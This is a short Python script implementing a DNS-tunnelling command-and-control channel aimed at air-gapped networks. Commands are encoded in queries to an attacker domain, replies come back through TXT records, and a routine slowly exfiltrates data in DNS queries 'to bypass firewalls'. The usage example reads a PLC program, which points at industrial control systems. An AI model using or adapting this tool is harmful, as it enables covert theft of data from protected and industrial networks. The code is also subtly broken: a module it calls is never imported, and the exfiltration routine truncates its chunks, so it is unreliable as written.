# dns_c2_channel.py - DNS tunneling for air-gapped networks
import dns.resolver
import base64
import binascii

class DNSC2:
    def __init__(self, domain="c2.attacker.com"):
        self.domain = domain
        self.resolver = dns.resolver.Resolver()

    def send_command(self, cmd_string):
        """
        Encode command in DNS query subdomain
        Example: base64cmd.c2.attacker.com
        """
        # Encode command
        encoded = base64.b32encode(cmd_string.encode()).decode().replace('=', '')

        # Split into DNS labels (max 63 chars each)
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]

        # Construct query
        query = '.'.join(labels) + f".{self.domain}"

        # Send DNS query
        try:
            answers = self.resolver.resolve(query, 'A')
            # Command acknowledged (dummy response)
            return True
        except:
            return False

    def receive_response(self, query_id):
        """
        Receive response via DNS TXT record
        Attacker updates TXT record with encoded response
        """
        query = f"{query_id}.response.{self.domain}"

        try:
            answers = self.resolver.resolve(query, 'TXT')
            for rdata in answers:
                # Decode TXT record
                response_b32 = str(rdata).strip('"')
                response = base64.b32decode(response_b32 + '===')
                return response.decode()
        except:
            return None

    def exfiltrate_data(self, data, chunk_size=200):
        """
        Exfiltrate data via DNS queries
        Very slow but bypasses firewall
        """
        # Split data into chunks
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

        for i, chunk in enumerate(chunks):
            encoded = base64.b32encode(chunk).decode().replace('=', '')
            query = f"{i}.{encoded[:63]}.exfil.{self.domain}"

            # Send chunk
            self.resolver.resolve(query, 'A')
            time.sleep(60)  # Slow exfiltration (1 chunk/minute)

# Usage
dns_c2 = DNSC2("c2domain.com")
dns_c2.send_command("read_plc_program")
response = dns_c2.receive_response("12345")
